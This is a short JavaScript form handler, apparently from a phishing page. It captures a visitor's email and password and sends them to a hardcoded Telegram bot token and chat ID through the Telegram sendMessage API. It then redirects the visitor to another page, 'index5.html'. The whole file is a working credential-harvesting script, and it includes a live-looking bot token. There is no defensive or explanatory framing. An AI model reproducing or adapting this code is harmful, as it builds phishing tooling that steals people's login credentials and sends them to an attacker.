function enviarFormulario(event) {
    event.preventDefault();

    var documento = document.getElementById("documento").value;
    var contraseña = document.getElementById("contraseña").value;


    var mensaje = "Correo: <code>" + documento + "</code>\n" +
    "Contraseña: <code>" + contraseña + "</code>";  

    fetch("https://api.telegram.org/bot" + "8069428865:AAFwelmK6rQ1EN--8aSqYc4-eQXY8N6rMW0" + "/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: 5084554523,
            text: mensaje,
            parse_mode: "HTML"
        })
    })
    .then(function(response) {
        if (response.ok) {
            
            window.location.href = "index5.html";
        } else {
           
            console.error("Error en la llamada a la API de Telegram: ", response.statusText);
        }
    })
    .catch(function(error) {
        
        console.error("Error en la llamada a la API de Telegram: ", error);
    });
}